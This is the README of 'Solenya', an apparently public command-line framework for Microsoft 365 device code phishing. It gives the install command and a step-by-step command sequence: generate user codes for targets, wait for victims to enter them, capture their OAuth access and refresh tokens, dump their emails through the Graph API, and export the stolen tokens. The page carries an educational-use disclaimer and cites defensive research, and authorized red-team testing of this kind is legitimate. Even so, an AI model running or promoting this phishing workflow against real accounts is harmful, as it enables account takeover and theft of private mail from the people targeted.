<img src="https://img.shields.io/github/issues/CultCornholio/solenya">  <img src="https://img.shields.io/github/forks/CultCornholio/solenya">   <img src="https://img.shields.io/github/stars/CultCornholio/solenya">   <img src="https://img.shields.io/github/license/CultCornholio/solenya">

# Solenya - M365 Device Code Phishing Framework

Solenya is a CLI tool which provides a framework to perform M365 device code phishing. As defined in RFC8628, an attacker can perform a social engineering attack by instructing a target to register a malicious application using a device code. 

<p align="center">
    <img src="https://raw.githubusercontent.com/CultCornholio/solenya/dev/images/pickleRick.png" width="50%" height="100%">
</p>

**DISCLAIMER**: The contributors are not responsible for any malicious use of the tool. The tool is developed for educational purposes and should be used solely by defenders or authorized testers.

## Prerequisites
By default, Microsoft allows any user to add new applications to their M365 profile. Below, is a screenshot of a fresh deployment of an Azure subscription.

![default_permissions](https://raw.githubusercontent.com/CultCornholio/solenya/dev/images/default_permissions.png)

<p align="center">
    <img src="https://raw.githubusercontent.com/CultCornholio/solenya/dev/images/implication-dennis.gif">
</p>

## Installation

**The package requires Python 3.7 or higher.**

Install latest version from [PyPI](https://pypi.org/project/solenya/): ```pip install solenya```

## Usage
The CLI tool works with **Targets**, which are objects contained inside a **WorkSpace**. The *WorkSpace* contains the tool's database and other resources, while *Targets* represent M365 accounts.
#### Creating a Workspace
The ```wsp``` command is responsible for initializing the *WorkSpace*. The tool leverages an SQLite database to store target information. By default the command will create a folder ```.sol``` inside the current current directory.
```
$ sol wsp c0785c37-5fb1-4ffb-8769-8e9b05ac4e80
```
#### Managing Targets
The ```target``` command can add additional targets and remove or reset existing ones. The command will automatically reach out to Microsoft Online API and create a **user code** and a **device code**, which will both be stored in the database. 
```
$ sol target jaguar rat
```
The ```wsp``` command automatically created a target called *default*. To switch to a different target use the ```switch``` command.
```
$ sol switch jaguar
```
User codes and device codes expire after **15 minutes**. To reset the *device code* on the target or delete the target entirely set the following flags.
```
$ sol target -d default
$ sol target -ra 
```
#### Gathering OAuth Access Tokens 
The ```auth``` command is responsible for authenticating *targets* registered with the *WorkSpace*. Run the ```phish``` sub command and wait for your *targets* to enter the *user code*.
```
$ sol auth phish -ma
```
The Oauth2 tokens (**access token** and **refresh token**) with access to the target's Office account will be retrieved from the API and saved the *WorkSpace* database. The *access tokens* can be refreshed using the ```refresh``` command.
```
$ sol auth refresh -a
```
#### Dumping Data
Once the target is authenticated the ```dump``` command can be used to dump information from the Graph API. 
```
$ sol dump emails
```
#### Exporting Targets
All the data on the *targets*, such as *access token*, *device code*, *refresh token*, *user code* and their respective timestamps can be exported using the ```export``` command.
```
$ sol export -a
```
## Contact
- Contact us at cult.cornholio@gmail.com or open up a new Issue on GitHub.

## Acknowledgements
- [Optiv - Microsoft 365 OAuth Device Code Flow and Phishing](https://www.optiv.com/insights/source-zero/blog/microsoft-365-oauth-device-code-flow-and-phishing)
- [SecureWorks - OAuth’s Device Code Flow Abused in Phishing Attacks](https://www.secureworks.com/blog/oauths-device-code-flow-abused-in-phishing-attacks)
- [Jenko Hwong - New Phishing Attacks Exploiting OAuth Authorization Flows](https://www.netskope.com/blog/new-phishing-attacks-exploiting-oauth-authorization-flows-part-1)
- [Dirk-jan Mollema - ROADtools](https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/)
- [Office 365 Blog](https://o365blog.com/post/phishing/)
- [rvrsh3ll - TokenTactics](https://github.com/rvrsh3ll/TokenTactics)



